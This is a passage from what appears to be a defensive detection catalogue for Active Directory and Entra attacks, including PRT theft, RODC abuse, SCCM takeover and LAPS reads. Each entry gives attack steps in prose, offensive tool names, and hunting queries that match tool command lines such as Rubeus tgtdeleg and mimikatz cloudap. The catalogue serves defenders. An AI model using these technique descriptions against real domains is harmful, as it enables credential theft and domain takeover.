THEFT/ESC/Shadow Credentials, acquire a PKINIT TGT with Rubeus asktgt /certificate or Certipy auth. Combined with UnPAC or U2U, also recover the NT hash; or, even when PKINIT is disabled, authenticate to LDAPS (certificate mapping) via Schannel to chain into RBCD granting or DCSync.","tools":"Rubeus (asktgt /certificate), Certipy (auth), PassTheCert, gettgtpkinit.py","detect":"Detect TGT issuance via PKINIT (4768 with certificate info), unexpected certificate-based LDAPS authentication, and Schannel client-certificate mapping. Monitor certificate authentication across many accounts in a short period and use of certificates from non-standard templates.","events":"4768 (PKINIT TGT, Certificate Information), 4887/4886 (ADCS発行), Schannelログ (36880系)","mitigate":"Enforce strong certificate mapping for certificate-based authentication (KB5014754 strong mapping) and remediate vulnerable templates/ESC. Revoke stolen certificates, audit KeyCredential on sensitive accounts, and protect ADCS.","triage":"On the DC pull 4768 (PKINIT TGT issuance with Certificate Information: Serial/Issuer/Thumbprint fields present), inspecting the authenticating account, source IP, and template, and correlate ADCS issuance logs 4886/4887 and Schannel logs (36880-series: protocol/cert mapping). It is black if a PKINIT TGT via a Shadow-Credentials/ESC-obtained certificate is for a privileged account from an unmanaged host (Rubeus asktgt /certificate, Certipy auth, PassTheCert) and is followed by UnPAC/U2U NT-hash recovery or RBCD grant/DCSync. It is benign for smartcard logon or WHfB/legitimate PKINIT where the cert is CA-issued from an expected template, used from the owner's own device in business hours, authenticating to a normal workstation/VPN. Cert auth across many accounts in a short window, 4768 with a non-standard/new template, or LDAPS cert mapping (Schannel) from unexpected hosts are black-leaning correlation signals.","hunt":[{"plat":"Sentinel","t":"PKINIT cert-based TGT (4768 with certificate info) concentrated from one source across many accounts = black / dispersed smartcard use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\"\n| summarize certTgts=count(), accounts=dcount(TargetUserName), users=make_set(TargetUserName, 12) by IpAddress, bin(TimeGenerated, 1h)\n| where accounts > 3 or certTgts > 15\n| sort by accounts desc"},{"plat":"MDI","t":"MDI cert/Kerberos logon success from an unusual device/IP = Pass-the-Certificate black / logon from the usual host = white","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"LogonSuccess\" and Protocol == \"Kerberos\"\n| summarize devices=dcount(DeviceName), ips=dcount(IPAddress), srcs=make_set(IPAddress, 8) by AccountUpn, bin(Timestamp, 1h)\n| where devices > 3 or ips > 3\n| sort by devices desc"}],"huntcs":[{"plat":"Event Search","t":"Rubeus asktgt /certificate / Certipy cert-TGT tooling=black / normal smartcard use=white","q":"event_simpleName=ProcessRollup2 ((CommandLine=\"*asktgt*\" AND (CommandLine=\"*/certificate*\" OR CommandLine=\"*/cert:*\")) OR CommandLine=\"*certipy*\" OR CommandLine=\"*/getcredential*\" OR (CommandLine=\"*.pfx*\" AND CommandLine=\"*Rubeus*\"))\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"4768 PKINIT cert info is DC-only; bulk/non-standard-template cert auth via Identity Protection","q":"// Falcon Identity Protection detection: PKINIT/certificate-based authentication anomaly (Pass-the-Certificate, unusual template or principal)"}]},{"name":"Primary Refresh Token (PRT) Theft & Abuse","aka":"PRT theft, PRT-cookie, hybrid SSO abuse","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1528","cve":"","sev":"High","summary":"A hybrid attack surface where PRT/PRT-cookie/session key are stolen from an Entra (Azure AD) hybrid-joined device to access Entra resources via cloud SSO with MFA bypass.","how":"After gaining SYSTEM/admin on a joined device, extract the PRT and its session key (established at PRT issuance and delivered encrypted to the device's transport key — not derived from the server nonce) from LSASS (CloudAP) or DPAPI, then forge an x-ms-RefreshTokenCredential (PRT-cookie). The PRT-cookie is signed with a key derived from the session key; the server-supplied nonce is embedded in the signed JWT for anti-replay and is not used in key derivation. Inject it into a browser to establish Entra SSO and reach cloud apps (M365, Azure), usually without an MFA re-prompt. Abusing the device key and transport key also enables persistent token issuance.","tools":"ROADtoken, AADInternals, Mimikatz (sekurlsa/cloudap), requestaadrefreshtoken, TokenTactics","detect":"In Entra ID sign-in logs, detect PRT-based SSO from anomalous device/location, non-interactive token issuance, and known-tool User-Agents. On the endpoint, use EDR to monitor LSASS (CloudAP) access and signs of PRT-cookie generation.","events":"Entra Sign-in logs (PRT/deviceトークン), 4624 + LSASSアクセス (Sysmon 10), Identity Protectionリスク検知","mitigate":"Apply Conditional Access (device compliance / phishing-resistant MFA / token protection) and enable TPM-based device keys and Credential Guard on endpoints. Block PRT abuse with risk-based sign-in and minimize local admin rights on devices.","triage":"On the joined host, confirm Sysmon EID 10 LSASS access (GrantedAccess 0x1010/0x1410 with unknown-module CallTrace) plus EID 1 execution of mimikatz/ROADtoken/AADInternals-class tools, then check Entra Sign-in logs for a PRT-based SSO (authenticationProtocol=primaryRefreshToken) for the same user issued non-interactively from an IP/device/location differing from that host's deviceId with an anomalous User-Agent and no MFA re-prompt chaining into M365/Azure — that is black. It is confirmed when Identity Protection fires Anomalous token / Unfamiliar sign-in properties concurrently and the token is used from another location (impossible travel) right after the host 4624. Conversely, a primaryRefreshToken SSO from the same registered device and network, with no EDR credential-access and inside business hours, is benign SSO (white).","hunt":[{"plat":"Entra","t":"One user's PRT-based SSO spreading across multiple countries/apps in a short window = PRT-theft abuse black / single-site normal SSO = white","q":"AADSignInEventsBeta\n| where Timestamp > ago(1d)\n| where isnotempty(AccountUpn)\n| summarize apps=dcount(ApplicationId), countries=dcount(Country), ips=dcount(IPAddress), cset=make_set(Country, 6) by AccountUpn, bin(Timestamp, 1h)\n| where countries > 1 and apps > 3\n| sort by countries desc"},{"plat":"MDE","t":"OpenProcess against LSASS (CloudAP) by a non-security process = PRT-cookie theft black / MsSense/AV legit access = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"OpenProcessApiCall\"\n| where FileName =~ \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\", \"MsSense.exe\", \"csrss.exe\", \"wininit.exe\", \"services.exe\")\n| summarize count() by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName\n| sort by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"ROADtoken/AADInternals/BrowserCore PRT-cookie or CloudAP theft tooling=black / legit WAM=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ROADtoken*\" OR CommandLine=\"*RequestAADRefreshToken*\" OR CommandLine=\"*Get-AADIntUserPRTToken*\" OR CommandLine=\"*AADInternals*\" OR (CommandLine=\"*sekurlsa*\" AND CommandLine=\"*cloudap*\") OR (CommandLine=\"*BrowserCore.exe*\" AND ParentBaseFileName!=\"BrowserCore.exe\"))\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"PRT-based SSO lives in Entra sign-in logs; anomalous device/location non-interactive token via Identity Protection","q":"// Falcon Identity Protection detection: PRT/device-token abuse — impossible travel + non-interactive SSO from unfamiliar device (Entra risk signal)"}]},{"name":"Rubeus tgtdeleg (Usable TGT Extraction)","aka":"tgtdeleg, GSS-API delegation ticket extraction","phase":"credaccess","group":"Kerberos","mitre":"T1558, T1550.003","cve":"","sev":"Medium","summary":"A technique that extracts a usable TGT for the current user (with session key) from the current logon session by abusing the GSS-API delegation mechanism, without plaintext or hashes.","how":"Rubeus tgtdeleg uses SSPI InitializeSecurityContext to request delegation without KERB_AP_OPTIONS_CBT, then pulls the current user's usable TGT and session key from the KRB-CRED (delegation ticket) inside the AP-REQ. No admin rights or hashes are needed, and it works even without unconstrained delegation, extracting from the current logon to serve as a starting point for Pass-the-Ticket and subsequent S4U/delegation attacks.","tools":"Rubeus (tgtdeleg), 相当のSSPI委任コード","detect":"tgtdeleg alone looks like legitimate Kerberos on the wire and is hard to detect, so detect the post-extraction Pass-the-Ticket (same TGT used on a different host, IP-mismatched 4769). Combine with EDR detection of the Rubeus process/command line.","events":"4769 (TGS要求, PtT兆候), 4768, EDRプロセス検知 (Rubeus)","mitigate":"Place sensitive accounts in Protected Users (TGT non-delegable, AES enforced) and deploy Kerberos armoring (FAST). Eliminate unconstrained delegation, shorten TGT lifetime, and operate Pass-the-Ticket detection (ticket-reuse correlation).","triage":"Because tgtdeleg looks like legitimate Kerberos on the wire, detect it at the source host via EDR/Sysmon EID 1 on the Rubeus process and command line (tgtdeleg, /nowrap) or anomalous child processes, then trace reuse of the extracted TGT. It is black when DC 4769/4768 show the same account's TGS requested from a host/IP different from the origin (Pass-the-Ticket signs: 4624 LogonType 3 with mismatched IP), especially with RC4 (Ticket Encryption Type 0x17) or an anomalous timeline. A lone delegation request with no subsequent IP mismatch or foreign-host reuse, matching a legitimately delegation-configured app or expected service-account behavior, is white.","hunt":[{"plat":"MDE","t":"Rubeus-specific command line (tgtdeleg/asktgt/ptt) = black / legitimate Kerberos tooling = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"tgtdeleg\", \"asktgt\", \"asktgs\", \"/ptt\", \"kerberoast\", \"createnetonly\", \"/rc4:\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"},{"plat":"Sentinel","t":"One account's TGS requests (4769) from many distinct source IPs in a short window = Pass-the-Ticket of an extracted TGT, black / single-host use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TargetUserName !endswith \"$\"\n| summarize srcIPs=dcount(IpAddress), ips=make_set(IpAddress, 8), rc4=countif(TicketEncryptionType == \"0x17\") by TargetUserName, bin(TimeGenerated, 1h)\n| where srcIPs > 3\n| sort by srcIPs desc"}],"huntcs":[{"plat":"Event Search","t":"Rubeus tgtdeleg exec=black (GSS-API delegated TGT extraction); network alone looks legit=process detect is key","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*tgtdeleg*\" OR (CommandLine=\"*Rubeus*\" AND CommandLine=\"*/nowrap*\"))\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"Post-extraction Pass-the-Ticket (same TGT from a different host, 4769 IP mismatch) is DC-only; via Identity Protection","q":"// Falcon Identity Protection detection: Pass-the-Ticket — TGS request (4769) source IP inconsistent with original TGT host"}]},{"name":"RODC Password Replication Policy Abuse (Credential Reveal)","aka":"PRP abuse / msDS-RevealOnDemand / RODC cache theft","phase":"credaccess","group":"Host / Local","mitre":"T1003","cve":"","sev":"High","summary":"Abuses an RODC's Password Replication Policy (msDS-RevealOnDemand/NeverRevealGroup) and local admin delegation to extract credentials of accounts within the RODC's cacheable scope. Branch/DMZ-deployed RODCs are a common entry point.","how":"An attacker who gains RODC local admin (administrator role delegation) extracts the cached secrets the RODC holds. Accounts on the PRP allow list (msDS-RevealOnDemand) are replicated and cached to the RODC on demand, so add a target to the allow list, force its authentication, and harvest the hash from NTDS/LSA on the RODC. Misconfiguration of the Allowed RODC Password Replication Group that makes high-privilege accounts cacheable is catastrophic.","tools":"Get-ADDomainControllerPasswordReplicationPolicy, repadmin /prp, mimikatz/secretsdump(RODC上), PowerView, BloodHound","detect":"Monitor changes to RODC PRP attributes (msDS-RevealOnDemand/msDS-NeverRevealGroup), Allowed RODC Password Replication Group membership changes, and credential replication of unexpected accounts to the RODC. Detect anomalous RODC local-admin operations with EDR.","events":"4728/4732(グループ変更), 5136(PRP属性変更), 4662","mitigate":"Minimize the PRP allow list and never cache privileged/Tier0 accounts on RODCs (Denied RODC Password Replication Group / msDS-NeverRevealGroup). Harden RODC local-admin delegation and physical protection. Exclude RODCs from the authentication path of sensitive accounts.","triage":"On writable DCs, pull 5136 for msDS-RevealOnDemand/msDS-NeverRevealGroup changes, 4728/4732 for additions to Allowed RODC Password Replication Group, and 4662 for PRP-property access to identify who and when. It is black if, right after, a targeted high-privilege account authenticates via the RODC (RODC 4768/4769) triggering cache replication, chained by the same actor to NTDS/LSASS access on the RODC (EDR/Sysmon EID 10, secretsdump-class) in a short window. Tied to a change ticket for planned delegation or branch-user additions, with no high-value account added and no credential-extraction artifacts on the RODC, it is legitimate PRP operation (white).","hunt":[{"plat":"Sentinel","t":"Change to RODC PRP attributes msDS-RevealOnDemand/msDS-NeverRevealGroup (5136) = staging for cached-cred theft, black / legit RODC design change = white","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID == 5136\n| where Properties has_any (\"msDS-RevealOnDemand\", \"msDS-NeverRevealGroup\", \"msDS-RevealedList\")\n| project TimeGenerated, Actor=SubjectUserName, ObjectName, OperationType, Properties, Computer\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Unexpected member added to Allowed RODC Password Replication Group (4728/4732/4756) = high-priv creds exposed to RODC, black / approved add = white","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4728, 4732, 4756)\n| where TargetUserName has \"Allowed RODC Password Replication\"\n| project TimeGenerated, EventID, MemberName, MemberSid, Actor=SubjectUserName, Computer\n| sort by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"PRP attr (msDS-RevealOnDemand/NeverRevealGroup) edit or Allowed RODC PRP group tooling=black / normal RODC ops=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*msDS-RevealOnDemand*\" OR CommandLine=\"*msDS-NeverRevealGroup*\" OR CommandLine=\"*Allowed RODC Password Replication*\" OR CommandLine=\"*Add-ADDomainControllerPasswordReplicationPolicy*\" OR CommandLine=\"*Sync-ADObject*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"5136 PRP-attr change / 4662 is DC-only; unexpected credential caching to RODC via Identity Protection","q":"// Falcon Identity Protection detection: RODC Password Replication Policy change + credential reveal-on-demand for unexpected principals"}]},{"name":"RODC krbtgt Golden Ticket (Scoped)","aka":"RODC-specific krbtgt (krbtgt_NNNNN) abuse / scope-limited Golden","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558.001","cve":"","sev":"High","summary":"Obtains the key of an RODC-specific krbtgt account (krbtgt_NNNNN) and forges a Golden Ticket-equivalent TGT scoped to what that RODC services (PRP-allowed accounts).","how":"Compromise an RODC and obtain the hash of the RODC-specific krbtgt (krbtgt_<numeric>, referenced by msDS-KrbTgtLink). A TGT forged with this RODC-krbtgt is a scoped Golden Ticket valid only against accounts/resources that PRP permits replicating to that RODC. The scope is limited but usable for persistence in a branch environment. Note it is a separate key from the writable DC's krbtgt.","tools":"mimikatz (kerberos::golden with RODC krbtgt), Rubeus, secretsdump(RODC)","detect":"Monitor for anomalous TGTs issued by the RODC-krbtgt, unexpected high-privilege access under that RODC, and anomalous access to the RODC krbtgt. As with normal krbtgt, detect lifetime/RC4 anomalies.","events":"4769 (対応する4768なし), 4624, 4672","mitigate":"On RODC compromise, reset the RODC-krbtgt (krbtgt_NNNNN). Minimize the PRP scope and do not cache high privileges on the RODC. Physically/logically protect the RODC and enforce Tier0 separation.","triage":"On the suspected RODC, use EDR to confirm extraction artifacts of the RODC-specific krbtgt (krbtgt_<numeric> referenced by msDS-KrbTgtLink) — NTDS/LSASS access, mimikatz/secretsdump — then analyze 4768/4769 under that RODC. It is black when TGTs issued by that RODC exceed the PRP-permitted scope or reference non-existent/invalid accounts, carry anomalous ticket lifetimes or fixed RC4 (0x17), and reach high-privilege resources (4672 after 4624). Remembering this key differs from the normal krbtgt, authentications within the correct PRP scope with default lifetimes/encryption during routine RODC operation or password-reset procedures are white.","hunt":[{"plat":"Sentinel","t":"TGT issued/used with RODC-scoped krbtgt (krbtgt_NNNNN) seen outside its RODC scope = scoped Golden Ticket, black / that RODC's normal issuance = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768, 4769)\n| where ServiceName startswith \"krbtgt_\"\n| summarize count(), accounts=dcount(TargetUserName), rc4=countif(TicketEncryptionType == \"0x17\"), ips=make_set(IpAddress, 8) by EventID, ServiceName, bin(TimeGenerated, 1h)\n| sort by count_ desc"},{"plat":"Sentinel","t":"RC4 (0x17) TGS requests concentrated on one account with no preceding 4768 = forged-TGT indicator, black / normal AES-dominant requests = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769 and TicketEncryptionType == \"0x17\"\n| where TargetUserName !endswith \"$\"\n| summarize rc4Tgs=count(), svcs=dcount(ServiceName), ips=make_set(IpAddress, 6) by TargetUserName, bin(TimeGenerated, 1h)\n| where rc4Tgs > 10 or svcs > 5\n| sort by rc4Tgs desc"}],"huntcs":[{"plat":"Event Search","t":"mimikatz/Rubeus forging TGT with RODC krbtgt (krbtgt_NNNNN)=black / no legit counterpart","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*krbtgt_*\" OR CommandLine=\"*kerberos::golden*\" OR (CommandLine=\"*golden*\" AND CommandLine=\"*/krbtgt*\") OR (CommandLine=\"*Rubeus*\" AND CommandLine=\"*/ticket:*\"))\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"RODC-krbtgt TGT lifetime/RC4 anomaly and out-of-scope privileged access is DC-only; via Identity Protection","q":"// Falcon Identity Protection detection: Golden Ticket anomaly (RODC-scoped krbtgt) — abnormal ticket lifetime/encryption, unexpected privileged use"}]},{"name":"SCCM Site Takeover (Site Server / Site DB)","aka":"Misconfiguration Manager TAKEOVER / SCCM Full Administrator hijack","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1557, T1187, T1078.002","cve":"","sev":"Critical","summary":"Exploits excessive permissions on the SCCM/MECM site server or site database to seize the site hierarchy, reaching domain-wide control via SYSTEM execution on all collection endpoints and credential harvesting.","how":"Gain SCCM Full Administrator via Misconfiguration Manager TAKEOVER techniques (e.g., NTLM-relaying the site server machine account to the site DB/SMS Provider, or privilege escalation on a management point). Then distribute SYSTEM commands to any collection via CMPivot or app/script deployment and harvest NAA and management-point credentials. In a hierarchy (CAS), taking over an upper site cascades to all lower sites.","tools":"SharpSCCM, sccmhunter, Misconfiguration Manager (TAKEOVER-*), ntlmrelayx (MSSQL/HTTP), PXEthief","detect":"Monitor for anomalous logins to the site DB (MSSQL), NTLM-relay traces of the site server machine account, changes granting the SMS Admin role (Full Administrator), and anomalous CMPivot/mass deployments. Correlate SCCM audit logs with MSSQL auditing.","events":"4624/4648(MSSQL/サイト), 4672, SCCM/MSSQL監査ログ","mitigate":"Protect site server/DB NTLM with EPA and signing, and isolate the site DB on a dedicated host. Minimize SMS Provider and SQL permissions, eliminate NAA at management points (move to Enhanced HTTP/PKI), and strictly manage and audit the Full Administrator role.","triage":"In the site DB (MSSQL) audit log and 4624/4648, check for the site server's machine-account credential being relayed/logged in via NTLM from an unexpected host, and correlate SCCM audit logs for grants/changes of the Full Administrator (SMS Admin) role plus CMPivot or mass app/script deployments. It is black when a host outside the SCCM infrastructure runs ntlmrelayx/SharpSCCM/sccmhunter-class processes (EDR) chaining site-DB login, admin-role grant, and broad SYSTEM deployment by the same actor in a short window. Legitimate console use, scheduled patch/app deployment, and approved role changes originating from a PAW/management server tied to change control are white.","hunt":[{"plat":"Sentinel","t":"Machine/SCCM-account logon to site DB/site server from multiple source IPs (4624/4648) = NTLM-relay takeover black / single fixed-IP operation = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4624, 4648) and LogonType in (3, 9)\n| where TargetUserName endswith \"$\" or Account has_any (\"sccm\", \"_sms\", \"sqlsvc\")\n| summarize logons=count(), srcIPs=dcount(IpAddress), ips=make_set(IpAddress, 8) by TargetUserName, Computer, bin(TimeGenerated, 1h)\n| where srcIPs > 1\n| sort by srcIPs desc"},{"plat":"Sentinel","t":"Full Administrator grant / special-privilege assignment (4672) appearing abnormally on SCCM servers = post-takeover black / approved admin = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4672\n| where Computer has_any (\"SCCM\", \"CM\", \"SMS\")\n| where PrivilegeList has_any (\"SeDebugPrivilege\", \"SeTakeOwnershipPrivilege\", \"SeBackupPrivilege\")\n| summarize count() by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where count_ > 0\n| sort by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"SharpSCCM/ntlmrelayx/CMPivot site-takeover tooling=black / legit ConfigMgr console=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*SharpSCCM*\" OR CommandLine=\"*ntlmrelayx*\" OR CommandLine=\"*CMPivot*\" OR CommandLine=\"*AdminService*\" OR CommandLine=\"*get naa*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"LogScale","t":"Non-SQL client (powershell/python) → site DB 1433=black (takeover/relay) / SMS Exec steady conn=white","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=1433\n| ContextBaseFileName=/^(powershell|pwsh|python|cmd|rundll32|SharpSCCM)/i\n| groupBy([ComputerName, ContextBaseFileName, RemoteAddressIP4], function=count())"}]},{"name":"SCCM PXE Boot Media Credential Extraction","aka":"PXE OSD credential theft / PXEthief / NAA harvesting","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1552, T1078.002","cve":"","sev":"High","summary":"In environments where SCCM PXE boot (OSD) is enabled, breaks the PXE media policy encryption to extract task sequence variables and credentials such as the Network Access Account (NAA).","how":"Request a boot from a PXE-enabled distribution point (DP) and obtain the encrypted media (variables.dat/policy). If the PXE password is unset/weak, decrypt it and harvest credentials, NAA, and the domain-join account from the task sequence. Automated with tools like PXEthief.","tools":"PXEthief, sccmhunter, SharpSCCM, powerpxe","detect":"Monitor for anomalous DHCP/PXE requests, suspicious boot requests to DPs, and anomalous use of NAA credentials. Review PXE media access logs.","events":"4624/4648(NAA使用), DHCP/WDSログ","mitigate":"Set a strong PXE password and, where possible, disable PXE/OSD. Eliminate the NAA and move to Enhanced HTTP/PKI, and do not embed credentials in task sequences. Network-isolate DPs.","triage":"On the DP/WDS server's WDS and DHCP logs, confirm PXE boot requests and boot-media (variables.dat/policy) downloads from a MAC/host outside asset inventory, then trace subsequent use of NAA and domain-join account credentials (4624/4648). It is black in environments with no/weak PXE password when PXEthief/powerpxe-class tools run (EDR), media is fetched, and the recovered NAA credential authenticates abnormally on another host (4624 LogonType 3 for an account not normally used for PXE). Legitimate OS deployment or new-device imaging within an approved window on registered hardware, with NAA use confined to the task sequence, is white.","hunt":[{"plat":"MDE","t":"Connection to WDS/PXE ports (UDP69 TFTP / 4011) from an unexpected host = PXE boot-media theft (PXEthief) black / known distribution-point ops = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort in (69, 4011)\n| summarize count(), hosts=make_set(RemoteIP, 8) by DeviceName, InitiatingProcessFileName, RemotePort, bin(Timestamp, 1h)\n| sort by count_ desc"},{"plat":"Sentinel","t":"NAA credential authenticating from an unexpected IP/host (4624/4648) = NAA harvested from PXE media, black / normal OSD deployment = white // confirm NAA name in your env","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4624, 4648)\n| where TargetUserName has_any (\"naa\", \"_na\", \"osdaccount\")\n| summarize count(), srcIPs=dcount(IpAddress), ips=make_set(IpAddress, 8) by TargetUserName, Computer, bin(TimeGenerated, 1h)\n| where srcIPs > 1\n| sort by srcIPs desc"}],"huntcs":[{"plat":"Event Search","t":"PXEthief-style PXE media / NAA credential extraction tooling=black / legit OSD ops=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*pxethief*\" OR CommandLine=\"*PXEThief*\" OR (FileName=\"python.exe\" AND CommandLine=\"*pxe*\") OR CommandLine=\"*get-naa*\" OR CommandLine=\"*variables.dat*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"LogScale","t":"Workstation → DP TFTP/PXE (69/4011) request=black (outside imaging window) / boot-time PXE=white","q":"#event_simpleName=NetworkConnectIP4\n| in(RemotePort, values=[69, 4011])\n| ContextBaseFileName=/^(python|powershell|pwsh|cmd)/i\n| groupBy([ComputerName, ContextBaseFileName, RemoteAddressIP4, RemotePort], function=count())"}]},{"name":"Share / SYSVOL Credential Mining (Snaffler)","aka":"Full-text file share scanning / Snaffler / PowerHuntShares","phase":"recon","group":"Credential Discovery","mitre":"T1552.001, T1083","cve":"","sev":"High","summary":"Full-text scans reachable file shares and SYSVOL to harvest plaintext/near-plaintext credentials found in scripts, config files, connection strings, KeePass/ini, etc.","how":"Enumerate shares as an authenticated user and scan with Snaffler/manspider targeting extensions and keywords (password, connectionString, .kdbx, unattend.xml, web.config, *.ps1). Rapidly extract credentials and sensitive files embedded in SYSVOL logon scripts and non-GPP configurations.","tools":"Snaffler, PowerHuntShares, manspider, findstr/grep","detect":"Detect broad file access to many shares by a single account (high volume of 5145), recursive enumeration of SYSVOL/shares, and Snaffler-specific access patterns. Use honeyfiles/canary tokens for early detection.","events":"5145(共有オブジェクトアクセス), 5140, 4663","mitigate":"Inventory shares and apply least privilege (fix over-permissioning), remove plaintext credentials from config files, and strip secrets from SYSVOL scripts. Deploy DLP/file auditing and honeyfiles.","triage":"On file servers/DC (SYSVOL), use 5145 to find a single account and single source IP broadly accessing many shares/RelativeTargetNames in a short window with recursive enumeration (plus 5140/4663) concentrated on patterns like password/connectionString/.kdbx/unattend.xml/web.config/*.ps1. It is black when the source host's EDR shows a Snaffler/manspider/PowerHuntShares-class process at the same time and a honeyfile/canary token is triggered. Periodic, exhaustive access by backup/DLP/asset-management/vulnerability scanners (known monitoring-server IPs and service accounts) during business hours with no canary hit is white.","hunt":[{"plat":"Sentinel","t":"One account recursively touching many shares/files in a short window (5145) = Snaffler-style mining, black / normal business file access = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| summarize accesses=count(), shares=dcount(ShareName), files=dcount(RelativeTargetName) by Account, IpAddress, bin(TimeGenerated, 10m)\n| where accesses > 500 or shares > 10\n| sort by accesses desc"},{"plat":"Sentinel","t":"Broad recursive enumeration of SYSVOL (5140/5145) spiking from a single source = GPP credential hunting black / normal gpupdate sync = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5140, 5145)\n| where ShareName has \"SYSVOL\"\n| summarize objs=dcount(RelativeTargetName), hits=count() by Account, IpAddress, bin(TimeGenerated, 10m)\n| where objs > 100\n| sort by objs desc"}],"huntcs":[{"plat":"LogScale","t":"1 host → many hosts 445 fan-out=black (share crawl) / backup/admin steady SMB=white","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=445\n| groupBy([ComputerName, ContextBaseFileName], function=[count(as=conns), count(RemoteAddressIP4, distinct=true, as=hosts)])\n| hosts > 30\n| sort(hosts, order=desc)"},{"plat":"Event Search","t":"Snaffler/PowerHuntShares/ShareFinder exec=black (credential hunting) / legit fileserver ops=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Snaffler*\" OR CommandLine=\"*PowerHuntShares*\" OR CommandLine=\"*Invoke-ShareFinder*\" OR FileName=\"Snaffler.exe\")\n| stats count by ComputerName, UserName, FileName, CommandLine"}]},{"name":"Windows LAPS Read / Decrypt (msLAPS-EncryptedPassword)","aka":"Current Windows LAPS (2023+) abuse / DPAPI-NG decryption","phase":"credaccess","group":"Host / Local","mitre":"T1552, T1078.002","cve":"","sev":"High","summary":"Reads msLAPS-Password / msLAPS-EncryptedPassword managed by current Windows LAPS (2023+) and, for the encrypted version, decrypts it with DPAPI-NG to obtain the local admin password. A separate attribute and defensive surface from the legacy ms-Mcs-AdmPwd (plaintext).","how":"With a principal holding Read on the target computer object's LAPS attributes, read msLAPS-Password directly if plaintext. If encrypted (msLAPS-EncryptedPassword), decrypt with DPAPI-NG in the context of the SID specified as the encryption target (by default Domain Admins, etc.) or that group. Also target reading from password history (msLAPS-EncryptedPasswordHistory) and DSRM backups.","tools":"LAPSToolkit, Get-LapsADPassword, NetExec (laps), PowerView, bloodyAD","detect":"Detect LDAP reads (4662) of LAPS attributes (msLAPS-Password/msLAPS-EncryptedPassword), decryption by unexpected principals, and audit ExtendedRights holders. Assess ReadLAPSPassword reachability with BloodHound.","events":"4662(LAPS属性アクセス), 4624","mitigate":"Restrict Read on LAPS attributes to a minimal set of admins and inventory regularly. Enable encryption (DPAPI-NG) and narrow the principals able to decrypt, operate password history and automatic rotation, and protect DSRM/backup paths.","triage":"On DCs, pull 4662 for access to msLAPS-Password/msLAPS-EncryptedPassword/msLAPS-EncryptedPasswordHistory attributes (via Properties GUID and AccessMask) to identify the reading principal, target computer object, and time. It is black when an unexpected principal enumerates LAPS attributes across many computers in a short window (LAPSToolkit/NetExec/bloodyAD-style pattern) and then that local-admin credential produces a 4624 LogonType 3 to the target. A one-off, scoped read by a legitimate helpdesk/PAW admin who holds ReadLAPSPassword (per BloodHound) during business hours for an in-scope machine is white.","hunt":[{"plat":"Sentinel","t":"LDAP read of LAPS attributes (msLAPS-Password/EncryptedPassword/ms-Mcs-AdmPwd) via 4662 concentrated from one principal across many hosts = black / approved single helpdesk read = white // confirm attribute GUID in your env","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"ms-Mcs-AdmPwd\", \"msLAPS-Password\", \"msLAPS-EncryptedPassword\")\n| summarize reads=count(), targets=dcount(ObjectName) by Actor=SubjectUserName, IpAddress, bin(TimeGenerated, 1h)\n| where reads > 5 or targets > 3\n| sort by targets desc"},{"plat":"MDI","t":"LDAP query targeting LAPS-stored attributes from an unexpected account/host = ReadLAPSPassword abuse black / management tool's routine read = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"ms-Mcs-AdmPwd\", \"msLAPS-Password\", \"msLAPS-EncryptedPassword\")\n| summarize count(), hosts=dcount(DeviceName), targets=make_set(QueryTarget, 